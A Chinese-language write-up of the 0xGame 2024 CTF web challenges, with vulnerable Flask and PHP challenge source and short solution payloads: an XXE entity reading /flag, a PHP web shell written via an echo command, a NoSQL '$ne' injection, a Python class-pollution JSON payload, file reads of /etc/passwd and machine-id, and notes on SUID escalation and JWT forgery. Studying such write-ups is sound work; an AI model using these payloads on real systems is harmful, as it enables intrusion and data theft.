---
title: '2024 0xgame CTF Writeup'
description: '然后进入 console 输入 pin 码即可'
pubDate: 2024-10-20
author: 'IHK-1'
tags: ['CTF', '0xgame', '2024']
---

# baby_pe

```plain
fileread?filename=/etc/passwd --> root
fileread?filename=%00 --> /usr/local/lib/python3.9/site-packages/flask/app.py
fileread?filename=/sys/class/net/eth0/address --> 02:42:ac:19:00:02
fileread?filename=/etc/machine-id --> 6ee8d0b5126041a1b3ddfefb9ea61b4e
```

然后进入 console 输入 pin 码即可

与其他 WP 文章计算的 PIN 码相同，但是无法进入

# baby_pickle（×）
# baby_ssrf
```python
from flask import Flask, request
import os
from urllib.parse import urlparse, urlunparse
import subprocess
import socket

app = Flask(__name__)
BlackList = ["127.0.0.1"]

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/cmd', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden"
    if request.method == "GET":
        return "Hello World!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()

@app.route('/visit')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "Hacker!"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

根据源码推测为通过 visit 进行 SSRF 访问  cmd ，进行命令执行

其中 127.0.0.1 可以使用 0.0.0.0 进行绕过，那么现在只需要解决如何进行 POST 发送参数即可

[SSRF基础:Gopher协议发送Get和Post请求_ssrf发post包-CSDN博客](https://blog.csdn.net/weixin_45887311/article/details/107327706)

通过该文章进行修改为 gopher 协议，进行传参 RCE 即可

# baby_xxe
```python
from flask import Flask, request
import base64
from lxml import etree

app = Flask(__name__)

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/parse', methods=['POST'])
def parse():
    xml = request.form.get('xml')
    print(xml)
    if xml is None:
        return "None"
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name = root.find('name').text
    return name or None

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)
```

审计源码，传参XML即可

```plain
<?xml version="1.0" ?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY>
    <!ENTITY xxe SYSTEM "file:///flag" >]>
    <root><name>&xxe;</name></root>
```

# hello_include
扫到 index.phps 拿到源码的备份

访问 phpinfo.php 查询到 flag  具体位置，进行文件包含 flag 即可

# hello_shell
无回显直接写入一句话木马即可，空格使用 %09 进行绕过

payload：

```plain
?cmd=echo%09"<?php%09@eval(\$_POST[shell]);?>"%09>%09shell.php
```

进入 shell 后发现需要进行提权

查看 suid ，发现 /var/www/html/wc 具有 suid 权限，尝试 SUID 文件读取

# picture
文件头判断以及文件后缀黑名单绕过

# Next.db 复现
```plain
{"name":{"$ne":1}}
```

该字符串表示查询所有非 1 的数字，所以绕过了 flag

# WhySoSerial（×）
# cargo_shop
审计代码，推测为购买 flag ，但是 flag 加个为1_000_000_000

由于购买与售出函数有符号型与无符号型变换，现在要做的是让加个变为负数，进行溢出

i32 max 为 2147483647 ，发现成功溢出了

直接购买 flag * 2147483647 使其溢出为 负数 -1_000_000_000

成功购买，访问 /flag 获得 flag

# hello_jwt 
hint1 未开启验证，所以直接伪造 role 为 Please, give me the hint 即可

hint2 因为 temp_key 是明文，直接使用 key 伪造 role 即可

那么只需要使用 hashcat 进行爆破即可

# Jekins

搜索对应版本 Jenkins ，有个 CVE CVE-2024-23897，直接找 EXP 打即可

# basic_flask
```python
from flask import Flask, request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and isinstance(v, dict):
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and isinstance(v, dict):
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Dst():
    def __init__(self):
        pass

dst = Dst()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return open("main.py").read()
    merge(request.get_json(), dst)
    return "Success"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000)
```

审计代码，发现是 python 原型链污染，需要污染 static 到根目录，进行访问 文件即可

```plain
{"__init__":{"__globals__":{"app":{"_static_folder":"/"}}}}
```

访问 /static/flag 拿到 flag

# basic_pwn（×）
```python
from flask import Flask, request

app = Flask(__name__)

functions = globals()['__builtins__'].__dict__

@app.route('/', methods=['GET'])
def index():
    return open(__file__).read()

@app.route('/pwn', methods=['POST'])
def pwn():
    stack = []
    stack.append('print')
    name = request.get_json().get("name")
    if not name:
        return "Fail"
    stack.extend(name)
    args = stack.pop()
    func = stack.pop()
    functions[func](args)
    return "Success"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

# rogue_mysql（×）
